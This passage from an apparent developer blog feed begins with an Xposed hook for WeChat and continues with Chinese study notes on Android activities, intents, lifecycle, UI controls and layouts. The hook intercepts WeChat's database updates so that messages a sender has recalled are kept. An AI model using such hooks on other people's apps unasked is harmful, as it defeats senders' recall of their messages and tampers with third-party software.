(!&quot;com.tencent.mm&quot;.equals(lpparam.packageName)) &#123;</span><br><span class="line">            return;</span><br><span class="line">        &#125;</span><br><span class="line">        final String className = &quot;com.tencent.wcdb.database.SQLiteStatement&quot;;</span><br><span class="line">        final String methodName = &quot;executeUpdateDelete&quot;;</span><br><span class="line">        Class&lt;?&gt; SDClazz = XposedHelpers.findClass(className, lpparam.classLoader);</span><br><span class="line">        XposedBridge.hookAllMethods(SDClazz, methodName, new XC_MethodHook() &#123;</span><br><span class="line">            @Override</span><br><span class="line">            protected void beforeHookedMethod(MethodHookParam param) throws Throwable &#123;</span><br><span class="line">                super.beforeHookedMethod(param);</span><br><span class="line">                Log.d(&quot;VxHook&quot;, &quot;executeUpdateDelete&quot;);</span><br><span class="line">                Object mDatabase = XposedHelpers.getObjectField(param.thisObject, &quot;mDatabase&quot;);</span><br><span class="line">                String mSql = (String) XposedHelpers.getObjectField(param.thisObject, &quot;mSql&quot;);</span><br><span class="line">                Log.d(&quot;zxk1ng&quot;,mSql);</span><br><span class="line">                Object[] mBindArgs = (Object[]) XposedHelpers.getObjectField(param.thisObject, &quot;mBindArgs&quot;);</span><br><span class="line">                cnt+=1;</span><br><span class="line">                if ((&quot;UPDATE message SET msgId=?,type=?,content=? WHERE msgId=?&quot;.equals(mSql)) &amp;&amp; ((String) mBindArgs[2]).contains(&quot;撤回了一条消息&quot;) &amp;&amp; cnt%2==0 ) &#123;</span><br><span class="line"></span><br><span class="line">                    Object sm = XposedHelpers.newInstance(lpparam.classLoader.loadClass(&quot;com.tencent.wcdb.database.SQLiteStatement&quot;),</span><br><span class="line">                            mDatabase,</span><br><span class="line">                            &quot;select content from message where msgId = ?&quot;,</span><br><span class="line">                            new Object[]&#123;mBindArgs[3]&#125;);</span><br><span class="line">                    String msg = (String) XposedHelpers.callMethod(sm, &quot;simpleQueryForString&quot;);</span><br><span class="line">                    Log.d(&quot;zxk1ng&quot;,msg);</span><br><span class="line">                    Log.d(&quot;zxk1ng&quot;,(String) mBindArgs[2]);</span><br><span class="line">                    Log.d(&quot;zxk1ng&quot;,&quot;===================&quot;);</span><br><span class="line">                    if (!msg.contains(&quot;&lt;msg&gt;&quot;) ) &#123; //不包含时 执行</span><br><span class="line">                        mBindArgs[2] = mBindArgs[2] + &quot;:&quot; + msg;</span><br><span class="line">                        Log.d(&quot;zxk1ng&quot;,(String) mBindArgs[2]);</span><br><span class="line">                        Log.d(&quot;zxk1ng&quot;, &quot;对方撤回了：&quot; + msg);</span><br><span class="line"></span><br><span class="line">                    &#125; else &#123;</span><br><span class="line">                        param.setResult(1);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/posts/0.html"/>
      <url>/posts/0.html</url>
      
        <content type="html"><![CDATA[<h1>《第一行代码》</h1><h2 id="Activity">Activity</h2><h3 id="在活动中使用Menu">在活动中使用Menu</h3><p>在res目录下新建一个menu文件夹，文件夹下新建一个名叫main的菜单文件，右键menu文件夹–&gt;New–&gt;Menu resource file,文件名为main。然后在main.xml中添加如下代码：</p><p><img src="C:%5CUsers%5C%E5%8A%B3%E5%8A%B3%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240717145842714.png" alt="image-20240717145842714"></p><p>创建两个菜单项，<item>标签用来创建一个具体的菜单项，android:id给菜单项指定一个唯一的标识符，android:title给菜单项指定一个名称，接着重写onCreateOptionsMenu()方法<br><img src="C:%5CUsers%5C%E5%8A%B3%E5%8A%B3%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240717150644340.png" alt="image-20240717150644340"></p><p>通过getMenuInflater()方法得到MenuInflater对象，再调用inflate()方法就可以给当前活动创建菜单了，inflate()有两个参数，第一个参数用于指定我们通过哪一个资源文件来创建菜单，这里传入R.menu.main，第二个参数指定我们菜单项将添加到哪一个Menu对象当中，这里直接传入参数menu，返回true允许菜单显示，相反则false。</p><p>当然我们可以重写onOptionsItemSelected()实现菜单点击响应事件。</p><p><img src="C:%5CUsers%5C%E5%8A%B3%E5%8A%B3%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240717151418765.png" alt="image-20240717151418765"></p><p>通过item.getItemId()判断点击的是哪一个菜单项</p><h3 id="Intent在活动使用">Intent在活动使用</h3><h4 id="显示启动Activity"><strong>显示启动Activity</strong></h4><p><img src="C:%5CUsers%5C%E5%8A%B3%E5%8A%B3%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240717152652636.png" alt="image-20240717152652636"></p><h4 id="隐式启动Activity"><strong>隐式启动Activity</strong></h4><p><img src="C:%5CUsers%5C%E5%8A%B3%E5%8A%B3%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240717153253483.png" alt="image-20240717153253483"></p><p>配置如下：</p><p><img src="C:%5CUsers%5C%E5%8A%B3%E5%8A%B3%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240717153309587.png" alt="image-20240717153309587"></p><p>其中category的这个为默认的category，使用startActivity会自动将这个category添到intent</p><p><strong>添加一个category</strong></p><p><img src="C:%5CUsers%5C%E5%8A%B3%E5%8A%B3%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240717153932110.png" alt="image-20240717153932110"></p><p>配置如下</p><p><img src="C:%5CUsers%5C%E5%8A%B3%E5%8A%B3%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240717153943644.png" alt="image-20240717153943644"></p><h4 id="intent启动其他程序的活动">intent启动其他程序的活动</h4><p>调用系统的浏览器打开网页</p><p><img src="C:%5CUsers%5C%E5%8A%B3%E5%8A%B3%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240717154420350.png" alt="image-20240717154420350"></p><p>Intent的action为Intent.ACTION_VIEW，这是系统内置的动作，其常量值为<code>android.intent.action.VIEW</code></p><p>Uri.parse：网址字符串解析为一个Uri对象，再调用setData()将这个Uri对象传递进去。</p><p>setDate()：接收一个Uri对象，主要用于指定当前Intent正在操作的数据，数据通常已字符串形式传入到Uri.parse</p><p>我们还可以在<code>&lt;intent-filter&gt;</code>中配置<code>&lt;data&gt;</code>标签，更精确指定当前活动响应什么类型的数据。<code>&lt;data&gt;</code>标签配置以下内容</p><ul><li>android:scheme：用于指定数据的协议部分，如http</li><li>android:host：指定数据的主机名部分，<a href="http://xn--www-eo8e.baidu.com">如www.baidu.com</a></li><li>android:port：指定数据端口部分，一般紧跟主机名后</li><li>android:path：用于指定主机名和端口之后的部分，如一段网址中跟在域名之后的内容</li><li>android:mimeType：用于指定可以处理的数据类型，允许使用通配符方式进行指定</li></ul><p>只有<code>data</code>标签中指定内容和Intent中携带的Data完全一致时，当前活动才能响应Intent，android:scheme为http，则响应所有http协议的Intent</p><p><img src="C:%5CUsers%5C%E5%8A%B3%E5%8A%B3%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240717161643442.png" alt="image-20240717161643442"></p><p>此时这个activity就可以响应一个打开网页的Intent了吗，(这里报错，应该和版本啥的有关系，没细究)</p><p><strong>调用系统拨号界面</strong></p><p><img src="C:%5CUsers%5C%E5%8A%B3%E5%8A%B3%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240717161947683.png" alt="image-20240717161947683"></p><h4 id="向下一个活动传递数据"><strong>向下一个活动传递数据</strong></h4><p>传递数据</p><p><img src="C:%5CUsers%5C%E5%8A%B3%E5%8A%B3%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240717173838919.png" alt="image-20240717173838919"></p><p>下一个活动接收数据</p><p><img src="C:%5CUsers%5C%E5%8A%B3%E5%8A%B3%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240717173908890.png" alt="image-20240717173908890"></p><h4 id="返回数据给上一个活动">返回数据给上一个活动</h4><p>接收数据</p><p><img src="C:%5CUsers%5C%E5%8A%B3%E5%8A%B3%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240717175001474.png" alt="image-20240717175001474"></p><p>传递数据</p><p><img src="C:%5CUsers%5C%E5%8A%B3%E5%8A%B3%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240717175020237.png" alt="image-20240717175020237"></p><ul><li><p>startActivityForResult()：启动一个活动，当活动销毁时返回一个结果给上一个活动，销毁后回调上一个方法的onActivityResult()方法</p></li><li><p>SecondActivity的Intent专门用来传递数据用的，没指定意图</p></li><li><p>setResult()：向上一个活动返回数据</p></li><li><p>onActivityResult(t requestCode, int resultCode, @Nullable Intent data)：<br>requestCode 启动活动时传入的请求码<br>resultCode 返回数据传入的处理结果<br>data 携带返回数据的intent</p></li></ul><p>当<strong>触摸返回键</strong>，数据返回上一个活动</p><p><img src="C:%5CUsers%5C%E5%8A%B3%E5%8A%B3%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240717180224720.png" alt="image-20240717180224720"></p><h3 id="活动的生命周期">活动的生命周期</h3><h4 id="活动状态">活动状态</h4><ol><li>运行状态：活动位于返回栈的栈顶时</li><li>暂停状态：活动不再处于栈顶位置，但仍可见，只有内存极低情况下，系统考虑回收这种活动</li><li>停止状态：活动不再处于栈顶位置，完全不可见。当其他位置需要内存时，处于这个状态的活动可能被系统回收</li><li>销毁状态：返回栈中移除。</li></ol><h4 id="活动生存期">活动生存期</h4><p>onCreate ()：活动第一次被创建时候调用，完成初始化</p><p>onStart()：活动由不可见变为可见的时候调用</p><p>onResume()：活动准备好和用户交互时候调用，此时活动位于栈顶，处于运行状态</p><p>onPause()：系统准备启动或者恢复另一个活动时调用</p><p>onStop()：活动完全不可见调用</p><p>onDestory()：活动被销毁前调用</p><p>onRestart()：活动由停止状态变为运行状态之前调用</p><p><strong>完整生存期</strong>：onCreate和onDestory之前经历的<br><strong>可见生存期</strong>：onStart()和onStop()之间经历的</p><p><strong>前台生存期</strong>：onResume和onPause之前经历的</p><p><code>android:theme=&quot;@android:style/Theme.Dialog&quot;</code>活动以对话框主题方式显示</p><h4 id="活动被回收时">活动被回收时</h4><p><strong>保存数据</strong></p><p>onSaveInstanceState()回调，这个方法保证活动被回收之前一定会被调用，用来保存被回收活动的数据</p><p>Bundle类型参数提供保存数据方法，如putString()保存字符串</p><p>每个保存方法两个参数，第一个键值，第二个要保存的内容。</p><p><strong>恢复数据</strong></p><p>onCreate()方法也有一个Bundle类型参数，一般为null，当通过onSaveInstanceState()保存数据时，onCreate的Bundle参数就会带有之前保存的全部数据。</p><p><img src="assets/image-20240718160852741.png" alt="image-20240718160852741"></p><p><img src="assets/image-20240718161106609.png" alt="image-20240718161106609"></p><h4 id="活动启动模式">活动启动模式</h4><p>standard，singleTop，singleTask，singleInstance</p><p>standard：默认启动模式</p><p>singleTop：当活动位于栈顶时，不再创建新的示例</p><p>singleTask：每次启动活动系统首先在返回栈中检查该活动是否存在实例，如果有则直接使用，并把在这个活动之上所有活动统统出栈。</p><p>singleInstance：单独一个返回栈管理这个指定活动</p><p><code>getTaskId()</code>：获得返回栈ID</p><h3 id="活动最佳实践">活动最佳实践</h3><h4 id="知晓当前是哪一个活动">知晓当前是哪一个活动</h4><p>新建一个Java.class–》BaseActivity，继承AppCompatActivity，重写onCreate如下</p><p>getClass().getSimpleName（）获得当前类名</p><p><img src="assets/image-20240718162008861.png" alt="image-20240718162008861"></p><p>在让BaseActivity成为活动的父类，如下</p><p><img src="assets/image-20240718162144676.png" alt="image-20240718162144676"></p><h4 id="随时随地退出程序">随时随地退出程序</h4><p>使用一个专门的集合类对所有活动进行管理就可以了</p><p><img src="assets/image-20240718164747821.png" alt="image-20240718164747821"></p><p>BaseActivity进行向List添加或者删除活动，因为活动继承BaseActivtiy，所以每个活动都会调用这个onCreate</p><p><img src="assets/image-20240718165844056.png" alt="image-20240718165844056"></p><p><code>android.os.Process.killProcess(android.os.Process.myPid())</code>用于kill当前进程</p><h2 id="UI控件">UI控件</h2><h3 id="控件使用方法">控件使用方法</h3><h4 id="TextView">TextView</h4><p>TextView文字默认在左上方</p><p><strong>指定文字对齐方式</strong></p><p><img src="assets/image-20240718181813169.png" alt="image-20240718181813169"></p><p>修改颜色大小</p><p><img src="assets/image-20240718181955059.png" alt="image-20240718181955059"></p><h4 id="Button">Button</h4><p>button默认字母大写，如下命令可以修改 <code>android:textAllCaps=&quot;false&quot;</code></p><h4 id="EditText">EditText</h4><p><img src="assets/image-20240718183150170.png" alt="image-20240718183150170"></p><p><code>android:maxLines=&quot;2&quot;</code>指定最大行数为2行</p><p>获取编辑框的内容 <code>String input=editText.getText().toString();</code></p><h4 id="ImageView">ImageView</h4><p>指定照片  <code>android:src=&quot;@drawable/ic_launcher_background&quot;</code></p><p>修改显示的图片</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Button button;</span><br><span class="line">    <span class="keyword">private</span> ImageView imageView;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        button = findViewById(R.id.button);</span><br><span class="line">        imageView=findViewById(R.id.image_view);</span><br><span class="line">        button.setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View view)</span> &#123;</span><br><span class="line">                <span class="keyword">switch</span> (view.getId())&#123;</span><br><span class="line">                    <span class="keyword">case</span> R.id.button:</span><br><span class="line">                        imageView.setImageResource(R.drawable.img);</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">default</span>:</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再点击按钮事件后，调用setImageResource()方法改变显示图片为R.drawable.img</p><h4 id="ProgressBar">ProgressBar</h4><p>用于界面上显示一个进度条</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;ProgressBar</span><br><span class="line">        android:<span class="attribute">id</span>=<span class="string">&quot;@+id/process_bar&quot;</span></span><br><span class="line">        android:<span class="attribute">layout_width</span>=<span class="string">&quot;match_parent&quot;</span></span><br><span class="line">        android:<span class="attribute">layout_height</span>=<span class="string">&quot;wrap_content&quot;</span>/&gt;</span><br></pre></td></tr></table></figure><p><strong>Android控件的可见属性</strong></p><p>通过android:visibility指定，有三个选择：visible，invisible，gone</p><p>visible：控件可见</p><p>invisible：控件不可见，但仍占据原来位置</p><p>gone：控件不可见，且不占用屏幕空间</p><p>还可以通过代码控制可见性</p><p>使用setVisibility()，传入View.VISIBLE，View.INVISIBLE，View.GONE</p><p>实现点击按钮让进度条消失出现</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">       <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">       setContentView(R.layout.activity_main);</span><br><span class="line">       button = findViewById(R.id.button);</span><br><span class="line">       progressBar=findViewById(R.id.progress_bar);</span><br><span class="line">       button.setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener() &#123;</span><br><span class="line">           <span class="meta">@Override</span></span><br><span class="line">           <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View view)</span> &#123;</span><br><span class="line">               <span class="keyword">switch</span> (view.getId())&#123;</span><br><span class="line">                   <span class="keyword">case</span> R.id.button:</span><br><span class="line">                       <span class="keyword">if</span>(progressBar.getVisibility()==View.GONE)&#123;</span><br><span class="line">                           progressBar.setVisibility(View.VISIBLE);</span><br><span class="line">                       &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                           progressBar.setVisibility((View.GONE));</span><br><span class="line">                       &#125;</span><br><span class="line">                       <span class="keyword">break</span>;</span><br><span class="line">                   <span class="keyword">default</span>:</span><br><span class="line">                       <span class="keyword">break</span>;</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;);</span><br><span class="line"></span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>ProgressBar控件通过style属性可以将他指定为水平进度条</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">style=<span class="string">&quot;?android:attr/progressBarStyleHorizontal&quot;</span></span><br><span class="line">android:<span class="built_in">max</span>=<span class="string">&quot;100&quot;</span>  <span class="comment">//进度条最大值</span></span><br></pre></td></tr></table></figure><p>动态更改进度条进度</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View view)</span> &#123;</span><br><span class="line">    <span class="keyword">switch</span> (view.getId())&#123;</span><br><span class="line">          <span class="keyword">case</span> R.id.button:</span><br><span class="line">               <span class="type">int</span> <span class="variable">progress</span> <span class="operator">=</span> progressBar.getProgress();</span><br><span class="line">               progress=progress+<span class="number">10</span>;</span><br><span class="line">               progressBar.setProgress(progress);</span><br><span class="line">               <span class="keyword">break</span>;</span><br><span class="line">           <span class="keyword">default</span>:</span><br><span class="line">               <span class="keyword">break</span>;</span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="AlterDialog">AlterDialog</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View view)</span> &#123;</span><br><span class="line">     <span class="keyword">switch</span> (view.getId())&#123;</span><br><span class="line">          <span class="keyword">case</span> R.id.button:</span><br><span class="line">              AlertDialog.Builder dialog= <span class="keyword">new</span> <span class="title class_">AlertDialog</span>.Builder(MainActivity.<span class="built_in">this</span>);</span><br><span class="line">              dialog.setTitle(<span class="string">&quot;This is dialog&quot;</span>);</span><br><span class="line">              dialog.setMessage(<span class="string">&quot;Something Important&quot;</span>);</span><br><span class="line">              dialog.setCancelable(<span class="literal">false</span>); <span class="comment">//点击对话框外 不能取消对话框</span></span><br><span class="line">              dialog.setPositiveButton(<span class="string">&quot;OK&quot;</span>, <span class="keyword">new</span> <span class="title class_">DialogInterface</span>.OnClickListener() &#123;</span><br><span class="line">                            <span class="meta">@Override</span></span><br><span class="line">                     <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(DialogInterface dialog, <span class="type">int</span> i)</span> &#123;</span><br><span class="line"></span><br><span class="line">                     &#125;</span><br><span class="line">              &#125;);</span><br><span class="line">              dialog.setNegativeButton(<span class="string">&quot;Cancel&quot;</span>, <span class="keyword">new</span> <span class="title class_">DialogInterface</span>.OnClickListener()</span><br><span class="line">                            <span class="meta">@Override</span></span><br><span class="line">                     <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(DialogInterface dialog, <span class="type">int</span> i)</span> &#123;</span><br><span class="line"></span><br><span class="line">                     &#125;</span><br><span class="line">              &#125;);</span><br><span class="line">              dialog.show();</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">           <span class="keyword">default</span>:</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="ProgressDialog">ProgressDialog</h4><p>会在对话框中显示一个进度条，一般用于表示当前操作比较耗时，让用户耐心等待。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">public void onClick(View view) &#123;</span><br><span class="line">     switch (view.getId())&#123;</span><br><span class="line">         case R.id.button:</span><br><span class="line">              ProgressDialog progressDialog=new ProgressDialog(MainActivity.this);</span><br><span class="line">              progressDialog.setTitle(&quot;This is dialog&quot;);</span><br><span class="line">              progressDialog.setMessage(&quot;Something Important&quot;);</span><br><span class="line">              progressDialog.setCancelable(false);</span><br><span class="line">              progressDialog.show();         </span><br><span class="line">              break;</span><br><span class="line">        default:</span><br><span class="line">              break;</span><br><span class="line">      &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意，progressDialog.setCancelable(false)传入false，表示不能通过Back键取消掉，必须通过调用dismiss()来关闭对话框。</p><h3 id="4种基本布局">4种基本布局</h3><h4 id="LinearLayout">LinearLayout</h4><p>控件垂直线性排列</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">android:<span class="attribute">orientation</span>=<span class="string">&quot;vertical&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;Button</span><br><span class="line">   android:<span class="attribute">id</span>=<span class="string">&quot;@+id/button1&quot;</span></span><br><span class="line">   android:<span class="attribute">layout_width</span>=<span class="string">&quot;wrap_content&quot;</span></span><br><span class="line">   android:<span class="attribute">layout_height</span>=<span class="string">&quot;wrap_content&quot;</span></span><br><span class="line">   android:<span class="attribute">text</span>=<span class="string">&quot;Button_1&quot;</span>/&gt;</span><br><span class="line">&lt;Button</span><br><span class="line">   android:<span class="attribute">id</span>=<span class="string">&quot;@+id/button2&quot;</span></span><br><span class="line">   android:<span class="attribute">layout_width</span>=<span class="string">&quot;wrap_content&quot;</span></span><br><span class="line">   android:<span class="attribute">layout_height</span>=<span class="string">&quot;wrap_content&quot;</span></span><br><span class="line">   android:<span class="attribute">text</span>=<span class="string">&quot;Button_2&quot;</span>/&gt;</span><br><span class="line">&lt;Button</span><br><span class="line">   android:<span class="attribute">id</span>=<span class="string">&quot;@+id/button3&quot;</span></span><br><span class="line">   android:<span class="attribute">layout_width</span>=<span class="string">&quot;wrap_content&quot;</span></span><br><span class="line">   android:<span class="attribute">layout_height</span>=<span class="string">&quot;wrap_content&quot;</span></span><br><span class="line">   android:<span class="attribute">text</span>=<span class="string">&quot;Button_3&quot;</span>/&gt;</span><br></pre></td></tr></table></figure><p>控件水平线性排列</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">android:<span class="attribute">orientation</span>=<span class="string">&quot;horizontal&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;Button</span><br><span class="line">   android:<span class="attribute">id</span>=<span class="string">&quot;@+id/button1&quot;</span></span><br><span class="line">   android:<span class="attribute">layout_width</span>=<span class="string">&quot;wrap_content&quot;</span></span><br><span class="line">   android:<span class="attribute">layout_height</span>=<span class="string">&quot;wrap_content&quot;</span></span><br><span class="line">   android:<span class="attribute">text</span>=<span class="string">&quot;Button_1&quot;</span>/&gt;</span><br><span class="line">&lt;Button</span><br><span class="line">   android:<span class="attribute">id</span>=<span class="string">&quot;@+id/button2&quot;</span></span><br><span class="line">   android:<span class="attribute">layout_width</span>=<span class="string">&quot;wrap_content&quot;</span></span><br><span class="line">   android:<span class="attribute">layout_height</span>=<span class="string">&quot;wrap_content&quot;</span></span><br><span class="line">   android:<span class="attribute">text</span>=<span class="string">&quot;Button_2&quot;</span>/&gt;</span><br><span class="line">&lt;Button</span><br><span class="line">   android:<span class="attribute">id</span>=<span class="string">&quot;@+id/button3&quot;</span></span><br><span class="line">   android:<span class="attribute">layout_width</span>=<span class="string">&quot;wrap_content&quot;</span></span><br><span class="line">   android:<span class="attribute">layout_height</span>=<span class="string">&quot;wrap_content&quot;</span></span><br><span class="line">   android:<span class="attribute">text</span>=<span class="string">&quot;Button_3&quot;</span>/&gt;</span><br></pre></td></tr></table></figure><p>如果不指定android:orientation，默认排列方向水平</p><p><strong>android:layout_gravity</strong>：用于指定控件在布局中对齐方式，需注意当线性布局排列方向是水平时，只有垂直方向的对齐方式才会生效，同理当线性布局排列方向是垂直时，只有水平方向的对齐方式才会生效</p><p><strong>android:layout_gravity</strong>使用如下</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">android:<span class="attribute">orientation</span>=<span class="string">&quot;horizontal&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;Button</span><br><span class="line">   android:<span class="attribute">id</span>=<span class="string">&quot;@+id/button1&quot;</span></span><br><span class="line">   android:<span class="attribute">layout_width</span>=<span class="string">&quot;wrap_content&quot;</span></span><br><span class="line">   android:<span class="attribute">layout_height</span>=<span class="string">&quot;wrap_content&quot;</span></span><br><span class="line">   android:<span class="attribute">layout_gravity</span>=<span class="string">&quot;top&quot;</span></span><br><span class="line">   android:<span class="attribute">text</span>=<span class="string">&quot;Button_1&quot;</span>/&gt;</span><br><span class="line">&lt;Button</span><br><span class="line">   android:<span class="attribute">id</span>=<span class="string">&quot;@+id/button2&quot;</span></span><br><span class="line">   android:<span class="attribute">layout_width</span>=<span class="string">&quot;wrap_content&quot;</span></span><br><span class="line">   android:<span class="attribute">layout_height</span>=<span class="string">&quot;wrap_content&quot;</span></span><br><span class="line">   android:<span class="attribute">layout_gravity</span>=<span class="string">&quot;center_horizontal&quot;</span></span><br><span class="line">   android:<span class="attribute">text</span>=<span class="string">&quot;Button_2&quot;</span>/&gt;</span><br><span class="line">&lt;Button</span><br><span class="line">   android:<span class="attribute">id</span>=<span class="string">&quot;@+id/button3&quot;</span></span><br><span class="line">   android:<span class="attribute">layout_width</span>=<span class="string">&quot;wrap_content&quot;</span></span><br><span class="line">   android:<span class="attribute">layout_height</span>=<span 